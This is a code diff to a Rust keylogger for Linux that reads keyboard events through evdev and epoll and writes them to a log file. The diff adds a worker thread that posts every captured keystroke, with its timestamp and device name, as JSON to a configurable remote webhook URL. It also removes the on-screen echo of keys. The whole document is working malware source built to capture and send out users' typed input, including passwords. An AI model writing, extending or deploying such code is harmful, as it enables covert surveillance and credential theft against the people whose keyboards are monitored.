@@ -6,8 +6,17 @@ use chrono::Local;
 use nix::fcntl::{FcntlArg, OFlag};
 use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
 use nix::unistd;
+use serde_json::json;
+use std::sync::mpsc;
+use std::thread;
 
-pub fn run_keylogger(log_path: &str) {
+struct KeystrokeData {
+    timestamp: String,
+    device: String,
+    key: String,
+}
+
+pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
     // Scan for all input devices
     let devices = evdev::enumerate()
         .collect::<Vec<_>>();
@@ -94,12 +103,53 @@ pub fn run_keylogger(log_path: &str) {
 
     println!("Keylogger is now active and monitoring keyboards.");
     println!("Keys will be logged to: {}", log_path);
-    println!("Keys will also be printed to this console.");
+    if webhook_url.is_some() {
+        println!("Keys will also be sent to the configured webhook URL.");
+    }
     println!("Press Ctrl+C to stop.\n");
     
     writeln!(file, "=== Monitoring started, waiting for key events ===")
         .expect("Failed to write to log file");
     file.flush().expect("Failed to flush log file");
+
+    // Set up webhook worker thread if URL is provided
+    let webhook_sender = webhook_url.map(|url| {
+        let (tx, rx) = mpsc::sync_channel::<KeystrokeData>(100); // Buffer up to 100 keystrokes
+        
+        // Spawn worker thread to handle webhook requests
+        thread::spawn(move || {
+            // Create HTTP client once
+            let client = match reqwest::blocking::Client::builder()
+                .timeout(std::time::Duration::from_secs(5))
+                .build() {
+                Ok(c) => c,
+                Err(e) => {
+                    eprintln!("Failed to create HTTP client: {}", e);
+                    return;
+                }
+            };
+            
+            // Process keystrokes from the channel
+            while let Ok(data) = rx.recv() {
+                let payload = json!({
+                    "timestamp": data.timestamp,
+                    "device": data.device,
+                    "key": data.key
+                });
+                
+                match client.post(&url).json(&payload).send() {
+                    Ok(_) => {
+                        // Successfully sent, no need to log on success
+                    }
+                    Err(e) => {
+                        eprintln!("Failed to send to webhook: {}", e);
+                    }
+                }
+            }
+        });
+        
+        tx
+    });
 
     // Create epoll instance
     let epoll_fd = epoll::epoll_create1(epoll::EpollCreateFlags::EPOLL_CLOEXEC)
@@ -152,9 +202,14 @@ pub fn run_keylogger(log_path: &str) {
                                                     .expect("Failed to write to log file");
                                                 file.flush().expect("Failed to flush log file");
                                                 
-                                                // Also print to console
-                                                print!("{}", key_str);
-                                                std::io::stdout().flush().unwrap();
+                                                // Send to webhook if sender is available
+                                                if let Some(ref sender) = webhook_sender {
+                                                    let _ = sender.try_send(KeystrokeData {
+                                                        timestamp: timestamp.to_string(),
+                                                        device: device_name.to_string(),
+                                                        key: key_str,
+                                                    });
+                                                }
                                             }
                                         }
                                     }
